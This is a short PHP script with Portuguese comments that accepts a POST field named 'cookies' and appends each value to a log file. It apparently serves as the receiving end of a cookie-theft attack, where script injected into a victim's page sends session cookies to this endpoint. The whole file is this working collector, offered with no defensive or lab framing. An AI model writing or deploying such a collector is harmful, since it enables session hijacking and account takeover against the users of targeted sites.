<?php
// Verifica se há cookies recebidos
if (isset($_POST['cookies'])) {
    // Grava os cookies em um arquivo de log (ou banco de dados)
    file_put_contents('cookies_log.txt', $_POST['cookies'] . "\n", FILE_APPEND | LOCK_EX);
    // Retorna uma resposta de sucesso para o cliente
    http_response_code(200);
} else {
    // Se não houver cookies recebidos, retorna um erro
    http_response_code(400);
    echo "Nenhum cookie recebido.";
}
?>
